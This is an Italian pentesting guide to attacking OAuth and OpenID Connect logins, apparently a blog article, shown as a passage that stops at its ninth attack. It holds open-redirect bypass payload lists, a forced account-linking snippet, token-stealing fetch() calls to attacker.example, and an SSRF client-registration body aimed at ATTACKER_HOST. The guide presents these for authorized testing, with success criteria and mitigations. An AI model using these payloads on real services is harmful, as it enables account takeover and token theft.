---
title: 'OAuth Pentesting: Exploit, Token Theft e Account Takeover'
slug: oauth-attack
description: ' OAuth e OIDC Pentest: verifica redirect_uri, state, vulnerabilità, PKCE, scope escalation e token leak con PoC, bypass, criteri di validazione e mitigazioni.'
image: /oauth-attack.webp
draft: false
date: 2026-03-17T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - OAuth Pentesting
  - OAuth Vulnerabilities
  - Account Takeover
  - Open Redirect
  - OAuth CSRF
---

# OAuth Attack: come testare e sfruttare le vulnerabilità OAuth e OpenID Connect

OAuth Attack indica l'insieme di tecniche che sfruttano gli errori di implementazione di OAuth 2.0 e OpenID Connect: `redirect_uri` validato male, `state` assente, PKCE opzionale, claim di identità non affidabili, token che escono dal flusso. Il risultato tipico è un [account takeover](/articoli/account-takeover/) con un solo click della vittima, senza rubare nessuna password e spesso aggirando anche la [MFA](/articoli/2fa-bypass/).

"Accedi con Google", "Sign in with GitHub", "Login with Microsoft": l'utente non crea un account, delega il login a un provider. Sulla carta è sicuro, ma OAuth è un framework con decine di parametri opzionali, più flussi (Authorization Code, Implicit, Client Credentials, Device Code) e tanta libertà d'implementazione. La sicurezza dipende da come sviluppatori e provider validano quei parametri, e nei pentest è raro trovare un'integrazione senza almeno un difetto: spesso bastano un [open redirect](/articoli/open-redirect/) o una [XSS](/articoli/xss/) sul client per far uscire un code o un token.

Copre i vettori classici (`redirect_uri`, `state`, PKCE, scope) e quelli che di solito mancano nelle guide: response type/mode switching, gadget `postMessage`, claim mutabili come nOAuth, device code phishing, consent phishing, client mobile e token lato API.

Questa guida è pensata per chi deve **testare** un login OAuth/OIDC in un ambiente autorizzato (pentest, bug bounty, lab): per ogni attacco trovi le condizioni necessarie, la richiesta da mandare, cosa osservare e quando puoi dire che il test è davvero riuscito. Perché è questo che separa un "payload provato" da una vulnerabilità dimostrata.

Satellite della [guida pillar Auth & Access Control](/articoli/auth-access-control-guida-completa/). Per la parte difensiva su token, scope e integrazioni di terze parti c'è [OAuth Security](/articoli/oauth-security/); qui ci concentriamo su exploit e test offensivi.

***

## OAuth e OpenID Connect: ruoli, flussi e differenza

**OAuth 2.0 è un framework di autorizzazione delegata**: permette a un'applicazione (il *client*) di ottenere accesso limitato ai dati di un utente (il *resource owner*) ospitati su un altro servizio, senza vedere la password. Il servizio che emette i token è composto da un *Authorization Server* (chi autentica l'utente e rilascia code e token) e da un *Resource Server* (le API che accettano il token).

**OpenID Connect (OIDC) è un livello di autenticazione sopra OAuth.** Aggiunge lo scope `openid`, l'**ID Token** (un JWT firmato con i claim sull'utente: `iss`, `aud`, `sub`, `exp`, `nonce`), l'endpoint `/userinfo` e la discovery `/.well-known/openid-configuration`. Quando un sito fa "login con Google" sta quasi sempre usando OIDC. Questa distinzione conta nei test: le difese OAuth (`state`, PKCE, `redirect_uri`) e quelle OIDC (`nonce`, validazione dell'ID Token) sono controlli diversi, e un'app può implementarne uno e dimenticare l'altro.

### Authorization Code Flow: il punto di partenza

```
1. The user clicks "Sign in with Google" on client.example
2. Il browser va all'Authorization Server:
   GET /authorize?
     client_id=CID
     &redirect_uri=https://client.example/callback
     &response_type=code
     &scope=openid%20email%20profile
     &state=RANDOM_BOUND_TO_SESSION
     &code_challenge=HASH_S256(code_verifier)
     &code_challenge_method=S256

3. The user logs in and grants consent
4. The AS answers with a redirect:
   https://client.example/callback?code=AUTH_CODE&state=RANDOM_BOUND_TO_SESSION

5. The client exchanges the code (server-to-server) at the token endpoint:
   POST /token  grant_type=authorization_code&code=AUTH_CODE
                &redirect_uri=https://client.example/callback
                &client_id=CID&client_secret=SECRET&code_verifier=VERIFIER

6. The AS returns access_token (+ id_token if OIDC)
7. The client reads the identity (/userinfo or ID Token) and creates the local session
```

### Dove si attacca il flusso

| Punto                       | Parametro / componente                | Cosa può andare storto                                                                          |
| --------------------------- | ------------------------------------- | ----------------------------------------------------------------------------------------------- |
| Richiesta di autorizzazione | `redirect_uri`                        | Validazione debole → furto di code/token                                                        |
| Richiesta e callback        | `state`                               | Assente, statico o non legato alla sessione → [CSRF](/articoli/csrf/) / account linking forzato |
| Richiesta e token endpoint  | `code_challenge` / `code_verifier`    | PKCE opzionale o downgradabile → code injection                                                 |
| Pagine dopo il callback     | URL, `Referer`, history               | Leak di code e token                                                                            |
| Token endpoint              | `code`, `redirect_uri`, `scope`       | Code riutilizzabile, redirect\_uri non confrontato, scope upgrade                               |
| Client                      | logica di login                       | Fiducia cieca nell'email o nei dati inviati dal browser                                         |
| OIDC                        | ID Token, registration, `request_uri` | Validazione claim assente, SSRF, session poisoning                                              |

***

## Preparare il test: recon dell'OAuth service

Prima di toccare i parametri mappa cosa hai davanti. Con [Burp Suite](/articoli/burp-suite/) in proxy fai il login completo e studia la cronologia: la prima richiesta del flusso è sempre un GET all'endpoint di autorizzazione con `client_id`, `redirect_uri` e `response_type`.

Poi interroga gli endpoint di discovery standard sul dominio dell'Authorization Server:

```bash
curl -s https://AS.example/.well-known/openid-configuration | jq .
curl -s https://AS.example/.well-known/oauth-authorization-server | jq .
```

Nel JSON cerca queste chiavi, perché ti dicono la superficie d'attacco reale:

```
authorization_endpoint, token_endpoint, userinfo_endpoint, jwks_uri
registration_endpoint                      → Dynamic Client Registration (SSRF, malicious client)
request_uri_parameter_supported            → requests by reference (SSRF, validation bypass)
response_types_supported / response_modes_supported   → implicit, fragment, web_message, form_post
code_challenge_methods_supported           → PKCE: S256, plain, missing
scopes_supported, claims_supported
```

Annota e salva nel report: `client_id`, `redirect_uri` registrato, `response_type`, presenza e valore di `state`, `nonce`, `code_challenge`, scope richiesti e il comportamento del callback. Ogni test successivo confronta il risultato con questa baseline.

***

## Attacco 1: redirect\_uri manipulation (furto di code e token)

Il `redirect_uri` dice all'Authorization Server **dove spedire il code o il token** dopo il login. Se il server non lo valida in modo rigoroso, l'attaccante costruisce un link che manda il code in un posto sotto il suo controllo. È la vulnerabilità OAuth più nota, ma anche la più fraintesa: non esiste un payload universale.

**Cosa dice lo standard.** La RFC 9700 (OAuth 2.0 Security BCP, gennaio 2025) impone che l'Authorization Server confronti il `redirect_uri` con quelli registrati usando **exact string matching**, con l'unica eccezione della porta variabile per gli URI `localhost` delle app native. I provider grandi (Google compreso) richiedono la corrispondenza esatta con uno degli URI autorizzati: sul loro lato i trucchi qui sotto, di solito, falliscono con un errore di mismatch. Le implementazioni vulnerabili sono quelle che usano pattern, wildcard, controlli "starts with", regex fatte male o framework open source/custom.

### Test sistematico della validazione

Il primo obiettivo non è l'exploit: è capire **come** il server valida. Parti dal valore legittimo e cambia una cosa alla volta:

```bash
# Baseline (must work)
redirect_uri=https://client.example/callback

# 1. Completely different domain (must fail on a healthy server)
redirect_uri=https://attacker.example/callback

# 2. Add path, query, fragment: what does it tolerate?
redirect_uri=https://client.example/callback/extra
redirect_uri=https://client.example/callback?x=1
redirect_uri=https://client.example/callback#x
redirect_uri=https://client.example/callbackx
```

Se `/callback/extra` o `callbackx` vengono accettati, il server controlla solo il prefisso: da qui in poi hai spazio. Prova poi le tecniche di parsing, una alla volta.

### Bypass da testare (e in che condizioni funzionano)

```bash
# Parsing discrepancies between components
redirect_uri=https://client.example &@foo.attacker.example#@bar.attacker.example/

# Parameter pollution: which of the two values does the server use?
redirect_uri=https://client.example/callback&redirect_uri=https://attacker.example/

# localhost "forgotten" in production: some servers accept any URI starting with localhost
redirect_uri=https://localhost.attacker.example/

# Path traversal: useful if the server validates the prefix but the path is normalized afterwards
redirect_uri=https://client.example/oauth/callback/../../altra/pagina

# Wildcard handled badly (RFC 9700 example, sec. 4.1.1)
# registered pattern: https://*.somesite.example/*   →  "*" interpreted as "any character"
redirect_uri=https://attacker.example/.somesite.example

# Wildcard handled correctly, but a subdomain can be taken over → subdomain takeover
redirect_uri=https://abandoned.somesite.example/
```

Condizioni, per non raccontare falsi positivi nel report:

* **`../` nel path non cambia l'host.** `https://client.example/callback/../../evil.com` non porta a `evil.com`: il traversal serve a raggiungere **un'altra pagina dello stesso dominio** (per esempio una con open redirect o XSS), non a uscire dal dominio.
* **Il fragment (`#@evil.com`) non cambia l'host** della destinazione HTTP. Funziona solo se un parser lato server si fa ingannare, e va dimostrato con la risposta reale.
* **Encoding (`%40`, `%2F%2F`) e parameter pollution** sono ipotesi da verificare, non bypass garantiti: dipendono da come il provider e il framework normalizzano l'URI.
* **`response_mode` e `redirect_uri` si influenzano.** Passare da `query` a `fragment` può cambiare il parsing del `redirect_uri`; se il server supporta `web_message`, spesso accetta una gamma più ampia di sottodomini. Prova sempre combinazioni di più parametri, non solo `redirect_uri` da solo.
* **Gli URI localhost** sono un caso specifico delle app native, non un trucco generale per le web app.
* **Subdomain takeover**: se la whitelist accetta un wildcard e hai un sottodominio dismesso prendibile, vedi [Subdomain Takeover](/articoli/subdomain-takeover/); è un vettore reale e frequente.

### Il toolkit dei filtri: payload da PayloadsAllTheThings

Quando il `redirect_uri` (o il parametro dell'open redirect che userai nella chain) passa da un filtro, la lista di PayloadsAllTheThings sull'open redirect è il vocabolario di partenza. Applicala nel punto in cui il filtro valida l'URL (spesso il `redirect_uri`, o il `next`/`url` dell'open redirect del client):

```
# Whitelisted domain as a subdomain of the attacker domain
https://client.example.attacker.example/

# Protocol-relative and variants (bypass blacklists on "http")
//attacker.example
////attacker.example

# Without double slash (bypasses blacklists on "//")
https:attacker.example

# Backslash (browsers and server-side parsers treat them differently)
\/\/attacker.example/
/\/attacker.example/

# Ideographic full stop (bypasses blacklists on the "." character)
//attacker%E3%80%82example
//attacker。example

# Null byte
//attacker%00.example

# HTTP Parameter Pollution on the redirect parameter
?next=client.example&next=attacker.example

# Userinfo with "@": the part before the @ is a credential, the host is the one after it
https://client.example@attacker.example/

# Folder named after the legitimate domain
https://attacker.example/https://client.example/
https://attacker.example/folder/client.example

# "?" instead of a slash: the browser turns it into "/?"
https://attacker.example?https://client.example/

# Unicode normalization (Host/Split)
https://evil.c℀.example.com
http://a.com／X.b.com

# CRLF to bypass blacklists on "javascript" (if the output ends up in an href or location)
java%0d%0ascript%0d%0a:alert(0)
```

I nomi di parametro più comuni dove cercare un open redirect nel client sono sempre gli stessi: `url`, `next`, `redirect`, `redirect_uri`, `redirect_url`, `return`, `return_to`, `returnTo`, `continue`, `dest`, `destination`, `go`, `target`, `rurl`, `redir`, `checkout_url`, `image_url`, `view`; più i pattern a path `/redirect/{payload}`. Per approfondire la parte generale c'è l'articolo sull'[Open Redirect](/articoli/open-redirect/).

### La chain con open redirect: usare il client come "proxy page"

Quando nessun trucco ti permette di mettere un dominio esterno nel `redirect_uri`, cambia obiettivo: **trova un'altra pagina, sul dominio già autorizzato, che possa spedire il code altrove.** L'open redirect è il candidato ideale; ma vanno bene anche una pagina con XSS, JavaScript che gestisce male query string e fragment, o un'HTML injection (con una `<img>` il code può finire nell'header `Referer`).

```
# The server accepts the prefix https://client.example/ and the client has /go?next= as an open redirect:
GET /authorize?client_id=CID&response_type=code&scope=openid%20email
    &state=ANY
    &redirect_uri=https%3A%2F%2Fclient.example%2Fgo%3Fnext%3Dhttps%3A%2F%2Fattacker.example%2Fcollect
```

Flusso: la vittima apre il link, fa login e dà il consenso, l'Authorization Server redirige a `client.example/go?next=...&code=CODE`, il client la rimbalza su `attacker.example`, e il tuo server riceve il `code` nell'URL (lo vedi nei log o su un listener tuo).

**Quando questa chain funziona davvero (e quando no):**

* Se l'Authorization Server **usa exact matching** il link viene rifiutato: la chain non esiste. Non è un bypass.
* Nel **code flow**, rubare il code non basta: al token endpoint il client invia il proprio `redirect_uri` legittimo, e un server corretto lo confronta con quello della richiesta iniziale (che nella tua chain era diverso). Se il confronto c'è, lo scambio fallisce. L'attacco riesce quando il server **non applica** quel confronto, oppure quando il code viene riscattato dal client legittimo con la sessione dell'attaccante (code injection, vedi più avanti). Un code rubato non è una credenziale universale.
* Nel **implicit flow** (`response_type=token`) il problema è più grave: il token arriva nel fragment e **il browser riattacca il fragment ai redirect** quando l'header `Location` non ne contiene uno. Con l'open redirect del client l'URL finale diventa `https://attacker.example/#access_token=...` e lo leggi da JavaScript (RFC 9700, sez. 4.1.2). Questo aggira anche pattern molto stretti, ma non l'exact matching. Una contromisura sul client è aggiungere un fragment fittizio (`#_`) negli header `Location`.

**Criterio di successo (cosa metti nel report):** (1) la richiesta con `redirect_uri` modificato non produce errore, (2) il code o il token compare sul tuo server di test, (3) hai dimostrato l'uso: o riscatti il code al callback legittimo ottenendo un `Set-Cookie` di sessione dell'account vittima, oppure chiami `/userinfo` con il token rubato.

```bash
# Impact proof on the code (test account, authorized environment)
curl -i -b cookies.txt "https://client.example/callback?code=CODE_RUBATO"
# Success = the client completes the exchange and answers with a Set-Cookie of the other identity's session
```

***

## Attacco 2: state assente o debole (CSRF OAuth e account linking forzato)

Il parametro `state` è il token anti-[CSRF](/articoli/csrf/) del flusso: il client lo genera, lo manda nella richiesta e lo ritrova identico nel callback, verificando che appartenga alla sua sessione. Se manca, è statico o non viene controllato, l'attaccante può far completare alla vittima un flusso OAuth **che ha iniziato lui**.

Lo scenario classico è il **forced profile linking**: il sito permette login sia con password sia con OAuth, quindi la vittima ha già un account locale.

1. Fai login normalmente sul client con **il tuo** account del provider e, in Burp, intercetta la richiesta di callback `GET /callback?code=ATTACKER_CODE`.
2. **Droppa la richiesta**: il code non deve essere consumato.
3. Fai aprire quell'URL alla vittima mentre è loggata sul client.
4. Il client collega la tua identità esterna al suo account locale.
5. Ora il tuo "Accedi con Google" ti porta nell'account della vittima.

Un dettaglio che nei test fa la differenza: **un `<img src=...>` non basta**. Una richiesta di sottorisorsa cross-site non invia i cookie di sessione con `SameSite=Lax` (default di Chrome), quindi il client non vede la sessione della vittima. Per ottenere un GET con cookie serve una **navigazione top-level**:

```html
<!-- Top-level navigation: Lax cookies are sent -->
<meta http-equiv="refresh" content="0;url=https://client.example/oauth-linking?code=ATTACKER_CODE">
<script>location = "https://client.example/oauth-linking?code=ATTACKER_CODE";</script>
```

Se in un lab l'`<iframe>` funziona è perché la configurazione dei cookie lo consente: non darlo per scontato, verifica `SameSite` del cookie di sessione nella risposta.

### Come verificare lo state

```
# 1. Is it present in the authorization request?
# 2. Does it change on every flow or is it static? (e.g. state=oauth_state always the same = no protection)
# 3. Is it bound to the session? (start the flow with session A and try to finish it with B)
# 4. Is it validated? Remove &state= from the callback or use a random one: does the callback still work?
# 5. Is it single-use? Reuse a state that was already consumed
```

**Criterio di successo:** dopo il callback forzato, l'account locale della vittima mostra il tuo profilo esterno collegato (o puoi fare login con la tua identità e finire nel suo account). Una GET isolata che risponde 200 non dimostra nulla.

Attenzione a due falsi positivi frequenti. Primo: se il sito consente **solo** login via OAuth, la mancanza di `state` porta di solito al *login CSRF* (la vittima entra nell'account dell'attaccante), un impatto più basso del linking. Secondo: `state` non è l'unica protezione valida. Un client può difendersi con **PKCE** (se ha verificato che il server lo supporti) oppure con **`nonce`** in OIDC; la RFC 9700 prevede entrambe le alternative. Prima di scrivere "CSRF" assicurati che nessuna delle tre difese sia attiva. Per la teoria generale vedi [CSRF](/articoli/csrf/).

***

## Attacco 3: authorization code, PKCE e code injection

L'authorization code è una credenziale a vita breve che il client scambia per i token. Un server ben fatto lo rende **monouso (se non lo è, entra in gioco la [race condition](/articoli/race-condition/) sullo scambio), a scadenza rapida, legato al `client_id` e al `redirect_uri` originale**, e lo vincola a PKCE.

### PKCE in due righe

Il client genera un `code_verifier` segreto, manda nella richiesta il suo hash (`code_challenge`, metodo `S256`) e al token endpoint presenta il verifier originale. Chi ruba il code non conosce il verifier, quindi non può riscattarlo. La RFC 9700 richiede PKCE per i client pubblici e lo raccomanda anche per quelli confidential; consiglia `S256` perché `plain` espone il verifier nella richiesta.

### Test sul token endpoint

```bash
# 1. Code reuse: the second request must fail (and ideally revoke the issued tokens)
curl -s -X POST https://AS.example/token \
  -d grant_type=authorization_code -d code=CODE \
  -d redirect_uri=https://client.example/callback \
  -d client_id=CID -d client_secret=SECRET
# repeat identically → if it still returns a token, the code is reusable

# 2. Different redirect_uri at exchange: is it compared with the initial one?
#    (change only redirect_uri in the POST; if the token still arrives, there is no comparison)

# 3. Code issued for another client_id: is it rejected?

# 4. Missing PKCE: exchange without code_verifier a code issued with code_challenge
curl -s -X POST https://AS.example/token \
  -d grant_type=authorization_code -d code=CODE -d client_id=CID \
  -d redirect_uri=https://client.example/callback
# if a token arrives, PKCE is not enforced

# 5. PKCE downgrade: start the flow WITHOUT code_challenge
GET /authorize?client_id=CID&response_type=code&redirect_uri=...&state=...
# if the code is issued anyway, PKCE is optional → the downgrade chain is open
```

Il **PKCE downgrade** (RFC 9700, sez. 4.8) funziona così: l'attaccante, dal proprio browser, rimuove il `code_challenge` dalla propria richiesta, ottiene un code non legato a PKCE e lo inietta nella sessione della vittima. Il server deve rifiutare ogni scambio che contiene un `code_verifier` se nella richiesta non c'era un `code_challenge`.

### Authorization code injection

Diversa dal furto: qui l'attaccante ha un code (della vittima o proprio) e lo **inietta nella propria sessione col client legittimo**, per far associare la sua sessione all'identità o alle risorse di un altro. Lo scambio avviene con il client legittimo, quindi `client_id`, secret e `redirect_uri` sono corretti. A fermarla sono PKCE o `nonce` verificati correttamente, non l'autenticazione del client. Un client che non valida `nonce` nell'ID Token o un server con PKCE opzionale sono i casi da cercare.

***

## Attacco 4: leak di code e token (Referer, history, log)

Il code (o il token, nell'implicit) viaggia nell'URL del callback. Un URL è un posto scomodo per un segreto, perché finisce in header, cronologia e log.

**Referer.** Se la pagina del callback carica risorse di terze parti (script analytics, pixel, immagini, iframe pubblicitari) o contiene link verso siti esterni, il browser può inviare l'URL del callback nell'header `Referer`. Verifica **cosa viene realmente inviato**: con il default dei browser moderni (`strict-origin-when-cross-origin`) le richieste cross-origin ricevono solo l'origine, **senza path né query**, quindi il code non esce. Il leak diventa possibile con policy permissive (`unsafe-url`, `no-referrer-when-downgrade`), con navigazione same-origin verso una pagina controllata dall'attaccante o con HTML injection sulla pagina di destinazione (come nell'esempio PortSwigger con `<img src="https://attacker.example">`).

```bash
# Check the policy of the callback page
curl -sI "https://client.example/callback?code=x" | grep -i referrer-policy

# In Burp: after login look at the requests to external domains and read the Referer header
# Success = the Referer contains "?code=..." (or "#access_token=...")
```

Chi vuole approfondire gli header di sicurezza (compreso `Referrer-Policy`) trova il quadro in [Security Headers](/articoli/security-headers/).

**Cronologia e log.** Un code nell'URL finisce nella history del browser e nei log di web server, reverse proxy e CDN; con la modalità `response_mode=form_post` evita di comparire nell'URL. Se riesci a leggere dei log (un exploit server, un access log esposto), il code lo trovi lì.

**Implicit flow e fragment.** Con `response_type=token` il token è nel fragment e JavaScript lo legge: una [XSS](/articoli/xss/) sul client o su una pagina raggiungibile come `redirect_uri` lo ruba. La RFC 9700 sconsiglia l'implicit per i nuovi sviluppi (usa Authorization Code con PKCE), ma molte app legacy lo usano ancora.

```javascript
// XSS on the page that receives the token: send it to your test server
fetch('https://attacker.example/c?t=' + encodeURIComponent(location.hash.slice(1)));
```

### Implicit flow implementato male (login bypass)

Qui il punto non è il furto del token ma la **fiducia che il client dà ai dati inviati dal browser**: è lo stesso errore di fondo di [Broken Authentication](/articoli/broken-authentication/), e una volta ottenuta la sessione si prosegue con [Session Hijacking](/articoli/session-hijacking/).

Nell'implicit flow il client riceve il token via browser e, per mantenere la sessione, lo rimanda al proprio server con una POST insieme ai dati utente. Il server non ha segreti da confrontare: **si fida di ciò che arriva**. Se non verifica che il token appartenga all'email indicata, cambi l'email e sei un altro utente (lab PortSwigger *Authentication bypass via OAuth implicit flow*):

```http
POST /authenticate HTTP/1.1
Host: client.example
Content-Type: application/json

{"email":"victim@example.com","username":"victim","token":"IL_TUO_TOKEN_VALIDO"}
```

**Criterio di successo:** la risposta imposta una sessione per `victim@example.com` pur essendo il token tuo. È la logica del client a essere rotta, non il provider.

***

## Attacco 5: scope upgrade

Lo scope upgrade è un caso di controllo degli accessi rotto lato token: stessa famiglia di [Broken Access Control](/articoli/broken-access-control/) e di [Mass Assignment](/articoli/mass-assignment/), perché il server si fida di un parametro che il client può modificare.

Lo `scope` definisce a quali dati può accedere il client. Cambiare il parametro nella richiesta di autorizzazione **non** ti dà automaticamente più privilegi: dipende da cosa ha registrato il client, da cosa approva l'utente e dalle policy del provider. L'attacco esiste in due varianti documentate, entrambe legate a una validazione difettosa dello scope sul server:

**Authorization code flow:** registri un client malevolo, l'utente approva `openid email`, e al token endpoint aggiungi scope extra. Se il server non lo confronta con quello approvato, ti emette un token più ampio.

```http
POST /token HTTP/1.1
Host: AS.example
Content-Type: application/x-www-form-urlencoded

client_id=CID&client_secret=SECRET&redirect_uri=https://client.example/callback
&grant_type=authorization_code&code=CODE&scope=openid%20email%20profile
```

**Implicit flow:** con un token rubato chiami `/userinfo` aggiungendo manualmente un parametro `scope` maggiore, sempre entro ciò che il client aveva già in registrazione.

**Criterio di successo:** il campo `scope` della risposta (o il token decodificato) contiene gli scope extra **e** una chiamata API con quel token restituisce dati che con lo scope originale erano negati. Il parametro modificato, da solo, non prova nulla.

***

## Attacco 6: account linking ed email non verificata

Quando un'app consente login classico e OAuth, deve decidere come collegare l'identità esterna a un account esistente. Se lo fa **solo sull'email**, nasce una classe di vulnerabilità realistica e ancora molto presente.

**Variante lato client (pre-account takeover).**

1. Registri sul client un account con l'email della vittima (`victim@company.com`) e una password tua, senza verificare l'email.
2. La vittima, più tardi, fa "Accedi con Google" con quell'email.
3. Il client trova l'account esistente e lo collega alla sua identità Google.
4. Tu conservi la password e quindi l'accesso allo stesso account.

**Variante lato provider.** Alcuni provider permettono di registrare account senza verificare l'email. Se ne crei uno con l'email della vittima, il client che si fida del dato può farti entrare nel suo account.

**Cosa controllare (e cosa chiedere nei test):**

* Il client collega gli account usando l'email o un identificatore stabile? Per OIDC l'identificatore giusto è `sub` (insieme a `iss`), non l'email.
* Viene letto il claim `email_verified`? Un'email non verificata non va usata come prova di identità.
* Cosa succede se esiste già un account locale con quell'email e non verificato?

**Criterio di successo:** dimostri che, dopo il flusso, **la stessa sessione/account** è raggiungibile sia con la tua password sia con l'identità della vittima. Le tecniche collegate sono nell'articolo sull'[Account Takeover](/articoli/account-takeover/) e in [Password Reset Attack](/articoli/password-reset-attack/).

***

## Attacco 7: OpenID Connect, i vettori "nascosti"

OIDC aggiunge funzioni che ampliano la superficie, e che nei test si dimenticano perché non compaiono nel traffico del browser.

### Validazione dell'ID Token

L'ID Token è un JWT, quindi valgono tutte le verifiche di [JWT](/articoli/jwt/): firma, algoritmo e chiave. In più il client deve controllare `iss` (emittente atteso), `aud` (il proprio `client_id`), `exp`, `nonce` (collegato alla sessione che ha avviato il flusso) e, quando c'è un access token nella stessa risposta, `at_hash`. Un client che salta `nonce` perde la protezione contro code injection e token injection (la RFC 9700 spiega che `at_hash` e `nonce` insieme bloccano l'iniezione di un access token rubato).

### Dynamic Client Registration: SSRF "by design"

Se il discovery espone un `registration_endpoint` raggiungibile senza autenticazione, puoi registrare un tuo client. Molti campi della registrazione sono URL che il server potrebbe richiedere in seguito: la prima cosa da provare è un **SSRF di secondo ordine**.

```http
POST /connect/register HTTP/1.1
Host: AS.example
Content-Type: application/json

{
  "application_type": "web",
  "redirect_uris": ["https://client.example/callback"],
  "client_name": "test",
  "logo_uri": "https://ATTACKER_HOST/logo.png",
  "jwks_uri": "https://ATTACKER_HOST/keys.jwks",
  "sector_identifier_uri": "https://ATTACKER_HOST/redirects.json",
  "request_uris": ["https://ATTACKER_HOST/request.jwt"]
}
```

I campi da osservare, perché spesso la richiesta parte più tardi, non alla registrazione:

* `logo_uri`: viene scaricato quando mostri la schermata di consenso, a volte lato server (SSRF) o solo con un `<img>` lato client (in tal caso c'è il rischio XSS se l'URL non è escapato).
* `jwks_uri`: viene richiesto quando presenti un `client_assertion` al token endpoint; di solito è SSRF *blind*.
* `sector_identifier_uri`: può essere letto subito alla registrazione o al primo flusso.
* `request_uris`: abilita richieste per riferimento (vedi sotto).

Dopo la registrazione fai partire un flusso `/authorize` con il nuovo `client_id` e osserva il tuo listener. Per l'impatto lato SSRF (metadata cloud, servizi interni) vedi [SSRF](/articoli/ssrf/).

### `request_uri`: SSRF e bypass delle validazioni

Alcuni server accettano i parametri della richiesta in un JWT referenziato da un URL. Controlla `request_uri_parameter_supported` nel discovery, o prova direttamente:

```
GET /authorize?response_type=code%20id_token&client_id=CID
    &request_uri=https://ATTACKER_HOST/request.jwt
```

Due cose da verificare: se il server **scarica** l'URL (SSRF; molti server accettano solo `request_uris` pre-registrati, quindi serve la registrazione) e se i parametri dentro il JWT, compreso il `redirect_uri`, ricevono la stessa validazione di quelli in query string. A volte no.

### `redirect_uri` session poisoning

Alcuni server controllano `client_id` e `redirect_uri` nel primo passo e li ricordano in sessione per consenso e rilascio del code. Se mandi due richieste di autorizzazione in parallelo con la stessa sessione della vittima (una con il client fidato, una con il tuo), puoi **avvelenare la sessione** e far consegnare il code al `redirect_uri` sbagliato. Aggiungere `prompt=consent` obbliga a mostrare la schermata anche per client già approvati. Un caso reale (CVE-2021-27582 su MITREid Connect) abusava del *binding* automatico dei parametri su un controller Spring: parente stretto della [Mass Assignment](/articoli/mass-assignment/). Il test è sempre di race: guarda anche [Race Condition](/articoli/race-condition/).

### WebFinger

L'endpoint `/.well-known/webfinger` è standard OIDC, di solito senza autenticazione. Se risponde 200/404 in base all'esistenza dell'utente puoi fare **user enumeration**; in implementazioni vulnerabili (OpenAM) il parametro `resource` finiva in un filtro LDAP. Occhio: i 404 sono normali, non escluderli dal content discovery.

```
GET /.well-known/webfinger?resource=acct:test@AS.example&rel=http://openid.net/specs/connect/1.0/issuer
```

***

## Attacco 8: response\_type, response\_mode e "dirty dancing"

Se `redirect_uri` è solido, il passo successivo è **rompere il flusso felice del client** in modo che code o token restino nell'URL di una pagina che li espone a terzi. È la tecnica documentata da Frans Rosén di Detectify come dirty dancing nei flussi OAuth di login: non serve XSS sul sito target, basta un gadget che legga `location.href`.

La catena ha quattro pezzi:

1. **Rompi il happy path:** il client non consuma mai code/token, quindi restano nell'URL.
2. **Atterra su una pagina "sporca":** errore o redirect che carica JavaScript di terze parti (analytics, chat, widget).
3. **Leggi l'URL:** un gadget lo restituisce a te.
4. **Usa la credenziale** per entrare come la vittima (serve un click su un link di login costruito da te).

### Come rompere il flusso (da provare uno alla volta)

```
# 1) Change response_type: with multiple types the code moves from the query to the fragment
GET /authorize?client_id=APP&response_type=code,id_token&redirect_uri=https://client.example/callback&state=X&nonce=Y
→ 302 https://client.example/callback#code=...&id_token=...&state=X

# 2) Also try the other response_mode values, if the provider accepts them
&response_mode=query | fragment | form_post | web_message

# 3) Manipulated state: if the client validates state AFTER receiving the code,
#    put your own valid state in the victim link. The client rejects the flow,
#    but the code stays in the URL.

# 4) redirect_uri quirks (if the provider does not do exact matching)
redirect_uri=https://client.example/CaLlBaCk            # case shifting
redirect_uri=https://client.example/callbackxxx         # path appending
redirect_uri=https://client.example/callback%3fcode=x%26 # parameter appending
```

**Perché `token`/`id_token` sono più interessanti di `code`:** con il code il provider ricontrolla il `redirect_uri` allo scambio sul token endpoint, quindi una mismatch blocca l'emissione. Con i response type impliciti quel secondo controllo non esiste.

### I gadget che leggono l'URL

| Gadget                                    | Cosa cercare                                                                        | Idea di sfruttamento                                                                                     |
| ----------------------------------------- | ----------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| `postMessage` senza controllo dell'origin | Listener di SDK di terze parti (analytics, chat) che rispondono con `location.href` | Apri la pagina d'errore in una finestra tua e mandi il messaggio in loop finché ricevi l'URL             |
| `window.name` / iframe di storage         | Widget che copia l'URL in `window.name` o in `localStorage` di un dominio terzo     | Frame del widget con parent/opener tuo e lettura via messaggi `sync`/`storage`                           |
| XSS su sandbox o CDN di terzi             | Domini che servono file caricati dai clienti                                        | XSS lì, poi accesso a opener/parent                                                                      |
| Opener relay                              | Pagina sul dominio legittimo che inoltra ogni `postMessage` a `window.opener`       | Il popup OAuth parte dal dominio legittimo e il messaggio con il token arriva a te (teorico nel writeup) |

Template di test per il caso `postMessage` (il formato del messaggio dipende dal gadget: va adattato leggendo il listener in DevTools, `getEventListeners(window)`):

```html
<script>
  const w = window.open('https://client.example/oauth/error?code=TEST&state=TEST');
  addEventListener('message', e => {
    fetch('https://attacker.example/c?d=' + encodeURIComponent(JSON.stringify(e.data)));
  });
  setInterval(() => w.postMessage({ type: 'getUrl' }, '*'), 200);
</script>
```

> **PKCE non risolve questo caso:** è l'attaccante a generare il `code_challenge` nel link, quindi il code rubato combacia con il suo verifier.

**Come lo dimostri:** il listener sul tuo server riceve code o token, e con quello ottieni una sessione dell'account di test vittima. Mappa sempre **tutte** le pagine raggiungibili dal flusso, comprese quelle di errore (parametri mancanti, state sbagliato, `error=access_denied`): è lì che si caricano gli script che non dovrebbero esserci. Il riferimento difensivo è la sezione sulle pagine post-risposta della RFC 9700.

### Caso reale documentato: Booking.com

I Salt Labs hanno mostrato una catena su Booking.com fatta di tre difetti che presi da soli sembravano minori: su Facebook era registrato solo l'origin (non il path), quindi il code poteva atterrare su qualsiasi path del dominio; un flusso leggeva da un `state` JSON in base64 una destinazione e vi reindirizzava senza controlli (open redirect); l'app mobile mandava al backend un `resultUri` usato poi come `redirect_uri` allo scambio. Con `response_type=code,token` il code viaggiava nel fragment fino al sito dell'attaccante, che lo riscattava nell'app con un `resultUri` coerente. Lezione per il test: **concatena i difetti**, e ogni open redirect va trattato come ingrediente di una chain (vedi [Open Redirect](/articoli/open-redirect/)).

***

## Attacco 9: claim mutabili e riuso di identità (nOAuth, domini scaduti, pre-hijacking)

Qui non rubi nessun token. Convinci l'app che **tu sei un'altra persona** perché identifica gli utenti con un claim che puoi controllare.

